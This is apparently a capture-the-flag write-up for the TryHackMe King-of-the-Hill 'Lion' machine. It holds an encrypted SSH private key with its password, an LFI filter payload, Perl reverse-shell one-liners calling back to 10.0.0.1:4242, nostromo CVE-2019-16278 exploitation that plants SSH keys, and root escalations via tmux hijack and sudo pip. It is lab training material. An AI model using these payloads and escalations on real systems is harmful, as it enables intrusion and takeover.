# Lion THM Public Writeup

#### Important Machine related information

#### Map
```lua
nmap service overview
-- Random port from 10000 - 65335 
-- Aquinas: this seems to get wrecked by rustscan i think. if connectable, basically serves as a cmd shell.
```

#### Default Credentials
```
X : Y
```

#### Network Services to Foothold

```bash
# Lion -->

ssh -o StrictHostKeychecking=no -i id_rsa -p 1337 root@

# note: ssh is on  1337
//chmod 400 id_rsa
note: for login ssh: ssh -i (file_id-rsa) <user>@<IP>

# Users:

gloria:id_rsa -> dance
# Aquinas the password has been `dance` over several tests

alex

marty

# gloria id_rsa (password dance):

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,DEA2FCB97D9A7EE91BB5502188F24BCA

5m/tHlXFlre3iBu/0wnnfEyS/p7qd0yjLDuG3jblth2CpwqIvPjGGq6hoFr6xdZO
8DOR/D16XDblHvvpJBlVfqHuXzIFbqDYCgvAeB8cZbxLaqhSi0H5fHT+N0MrMM5H
p3ejg2Nwk67BxygtjnvYgXKu+ALk0/NLDAj0NzztX+yOsSPvsyR2UjUSo352pMBt
lokw3kshMcqKs0G1UhBphV5bUgUTA0nPi5WBlIdmWC+Re0EHH+RvLulg0AxR6v5Q
UxqJJ/i0dLp6N7nTFANde+I5JwPEDJ/SGJJRWB/srcpVz3PSZuEJht83nmcJRZCz
S/x7iOhIUA1vBlexg/Td911H/95sofArhZDMPX54IMO7/q5AfIjDpqD8U9Pts7R0
aBq+1m2RfVB85FM11kJv5T0uNW6t5dP8BVb7Jqz60okgJg4cJMu5YMX7vj3xCxxy
5Hlc7PA/kIy/y2tRJmArvheuFB7qjRIPcuw1gw1TKDCUHS29aiN+ePCS4f236/if
9VwHnfp8wCUnO6ApRX9sJ6iAPMA8JYFpylIL/0XqEjZdu+ESWetTfGzsxXRdeNkY
L1/H4W9mNNIbNTnL3irr4SuKowFpKwxp6xhloZ4boyiWsdfLpmtUBE5euxjlppWp
2y7ZbtuKiqdTHkhPOZOnx7oi2FmWw81P4wS6nF2ObPpSq5LGf9TiLEw5i0icedkp
rnd/qkhkBuIQb6CKlW9m3AXgMRVQXa78J1lx60FdO1B9mtuhOy529GcwVkWh856x
MesHWvY33GmW0QcVKnUqhhFDbkT0l/X7UERTMAHVKZhfPeChuo/7LoqUqdMI57Se
U66OS9bu0INLLwcSlOAL9aweynt8MFo1DS+xQsJWTLSBnVz7iT6IMYUfhtO3gi5/
Oginxw/FPmGJ6THuFWi15k9dDdO3nBJhAQDHRpMYi4BLm/xPF7EXhgiGy6sBVGrF
PYlXHZvlQEJvHd/DCw0uwolEc3z4CilGKz1BX0WbCp9cEgkmM+Ez7QTvvBa5i6kg
qh1pAaZ+cNFDJi9bn76qEaCLCd1FMPnpcZgMUgwBfyKM+1YXa0gbxlS8fqgU066j
Mol50cLTM8D4tny3OvPcjW4FveCkhqJjGK7DY1Us7R3VDWAjOYIaMqSIM2ip6iLZ
ukq7K1r0t68eVDuDGcMLjfVihGywyqglqnqaXYcJ8+19ae76E3HVFIWbSU409fMp
fs8r6QLnuxvX1HHa74Hctuo6fzB7qokKV51ChmpXjN8h5uwEl0msbJSrKlIeYy0S
uURTlfqDq50HBr2yJYeuDzEpRjZuucXqkCIRZLSjKedf9mBtMq/3CvN9K/P45A2H
BYxl0pcZPaeUiwdR/bycLK1tBZm5kVSGIU2fK7IsKrgqZxzKS6kdr2FFsKs3HWMF
ScVJZPT4dqDo3PSIQUw7q0GixCLLdDU9p45CSKPVySYyiGU22RTQS2ccGEcCTurj
lcY0pO4wZmm5GkseF5moa/1c3aOUZOESAlWGpEg5PNPt3U/SWJTpziGv3NY5DLq9
R9OsbX0gkO711f8RvRTELQIYFIO/0LcKTjY16g8MtBlMKYCyJ0cWLVWAUoggJxiR
-----END RSA PRIVATE KEY-----

# ROOT PATHS

//gloria root path:
export TMUX=/.dev/session,1234,0
tmux

//alex path:
TF=$(mktemp -d)
echo "import pty; pty.spawn('/bin/bash')" > $TF/setup.py
sudo pip install $TF
```


LFI on 5555
```
curl --path-as-is` http://lion.thm:5555/?page=php://filter/convert.base64-encode/resource=../../../../etc/passwd
```

https://github.com/MatheuZSecurity/Koth-TryHackMe-Tricks/blob/master/README.md#-patching-web-application-vulnerable-
```
root@lion:/var/www/nginx# cat -v index.php
<html>
<head>
<link rel="stylesheet" type="text/css" href="bootstrap.min.css">
</head>
<body>
<nav class="navbar navbar-expand-lg navbar-dark bg-dark">
  <a class="navbar-brand" href="/">Gloria's Personal Site</a>
  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarColor02" aria-controls="navbarColor02" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>

  <div class="collapse navbar-collapse" id="navbarColor02">
    <ul class="navbar-nav mr-auto">
      <li class="nav-item active">
        <a class="nav-link" href="/">Home <span class="sr-only">(current)</span></a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="?page=posts.php">Posts</a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="?page=about.php">About</a>
      </li>
    </ul>
  </div>
</nav>
<div class="container"><br />
<h2>Gloria's Personal Site</h2>
<img src="image.png" style="width:400px;height:300px;"><br />
<?php
$allowedPages = array(
    'posts.php',
    'about.php'
);

$page = $_GET["page"];

if (in_array($page, $allowedPages)) {
    include($page);
} else {
    echo "No LFI for You x)";
}
?>
</div>
</body>
</html>

root@lion:/var/www/nginx#
```

can get in as `alex` due to unrestricted file load on `:80/uploads`. file should be a perl reverse shell script
```perl
perl -e 'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'


NOTE: Windows only
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

Unrestricted File load and Perl Reverse shell in Lion Machine.
```
root@lion:/var/www/html/upload# ls
image.png  index.php  uploads
root@lion:/var/www/html/upload# cat -v index.php
<?php
$filename = uniqid() . "-" . time();
$extension = pathinfo($_FILES["fileToUpload"]["name"], PATHINFO_EXTENSION);
$basename = $filename . '.' . $extension;
$target_dir = "uploads/";
$target_file = $target_dir . $basename;
$uploadOk = 1;

if (isset($_POST["submit"])) {
    // Check if file already exists
    if (file_exists($target_file)) {
        echo "Sorry, file already exists.";
        $uploadOk = 0;
    }

    // Check file size (limit to 500KB)
    $maxFileSize = 500000;
    if ($_FILES["fileToUpload"]["size"] > $maxFileSize) {
        echo "Sorry, your file is too large.";
        $uploadOk = 0;
    }

    // Validate file extension
    $allowedExtensions = array("jpg", "jpeg", "png", "gif");
    if (!in_array($extension, $allowedExtensions)) {
        echo "Sorry, only JPG, JPEG, PNG, and GIF files are allowed.";
        $uploadOk = 0;
    }

    // Check if $uploadOk is set to 0 by an error
    if ($uploadOk == 0) {
        echo "Sorry, your file was not uploaded.";
    } else {
        // If everything is ok, try to upload file
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            echo "The file " . basename($_FILES["fileToUpload"]["name"]) . " has been uploaded.";
            // Process or store the uploaded file securely
            // Do not execute the file directly
        } else {
            echo "Sorry, there was an error uploading your file.";
        }
    }
}
?>

<!DOCTYPE html>
<html>
<body>
    <center><br />
        <img src="image.png" style="width:300px;height:300px;"><br /><br />
        <form action="index.php" method="post" enctype="multipart/form-data">
            Select file to upload:
            <input type="file" name="fileToUpload" id="fileToUpload">
            <input type="submit" value="Upload" name="submit">
        </form>
    </center>
</body>
</html>

root@lion:/var/www/html/upload#
```

`gloria` via `:8080`, which runs nostromo 1.9.6 webserver vulnerable to RCE Nostromo RCE In Lion Machine. CVE-2019-16278
```bash
ss -anlpt|grep 8080
/var/nostromo/htdocs# python3 -m http.server 8080 -b $(ip a | grep "tun0 10" | awk '{print $2}' | cut -d/ -f1)

python2 cve2019-16278.py <KOTH MACHINE IP> 8080 "whoami"

python2 cve2019-16278.py <KOTH IP> 8080 "mkdir /home/gloria/.ssh; echo '<YOUR *.pub file data>' > /home/gloria/.ssh/authorized_keys"

ssh -i sshkey gloria@<KOTH BOX IP> -p 1337
```

#### Privilege Escalation

All users can seemingly hijack a `tmux` session used by root: `export TMUX=/.dev/session,1234,0` then just `tmux` to get a root session; best used with gloria after sshing in.
```

```

`alex` can run `pip3` as root via sudoers. doing the following will start a root shell, with no screen feedback. careful typing can create a suid sh binary or similar
```
```


```bash
TF=$(mktemp -d)
echo "import pty; pty.spawn('/bin/bash')" > $TF/setup.py
sudo pip install $TF
```


CVE-2017-16995
```bash
gcc --static cve-2017-16995.c -o cve-2017-16995 && chmod +x cve-2017-16995
```

#### Flags

```
/root/king.txt
tac /home/marty/user.txt #  reversed
/home/gloria/user.txt 
cat /home/alex/user.txt | tr '[A-Za-z]' '[N-ZA-Mn-za-m]' # rot13
/root/.flag

random high port: thm
user table in the blog database
```
#### References

https://www.reddit.com/r/linux4noobs/comments/xnogal/how_to_decode_rot13_using_tr_command/
https://github.com/Machinh/Koth-THM/blob/main/LION
https://github.com/holmes-py/King-of-the-hill?tab=readme-ov-file#machine-name-lion
https://github.com/ChrisPritchard/ctf-writeups/blob/master/tryhackme-koth/koth-lion.md